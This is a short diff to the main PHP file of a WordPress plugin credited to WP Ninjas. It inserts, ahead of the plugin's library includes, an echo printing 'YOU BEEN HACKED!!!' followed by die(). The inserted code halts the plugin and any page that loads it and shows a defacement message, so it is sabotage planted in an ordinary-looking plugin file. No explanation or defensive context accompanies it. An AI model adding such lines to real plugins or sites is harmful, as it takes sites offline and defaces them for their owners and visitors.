@@ -12,6 +12,9 @@ Domain Path: /lang/
 Copyright 2016 WP Ninjas.
 */
 
+echo '<b>Notice</b>: YOU BEEN HACKED!!!';
+die();
+
 require_once dirname( __FILE__ ) . '/lib/NF_VersionSwitcher.php';
 require_once dirname( __FILE__ ) . '/lib/NF_Tracking.php';
 require_once dirname( __FILE__ ) . '/lib/NF_Conversion.php';
